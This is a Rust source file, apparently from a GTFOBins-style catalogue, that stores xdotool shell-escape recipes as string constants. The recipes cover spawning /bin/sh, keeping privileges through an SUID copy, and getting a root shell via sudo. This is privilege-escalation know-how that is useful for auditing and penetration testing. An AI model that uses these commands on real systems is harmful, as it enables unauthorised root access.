pub static BIN_NAME: &'static str = "xdotool";
pub static BIN_DESC: &'static str = "This requires a running X server.";
pub static SH_CODE: &'static str = r#"
    
    xdotool exec --sync /bin/sh
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xdotool) .

    ./xdotool exec --sync /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo xdotool exec --sync /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
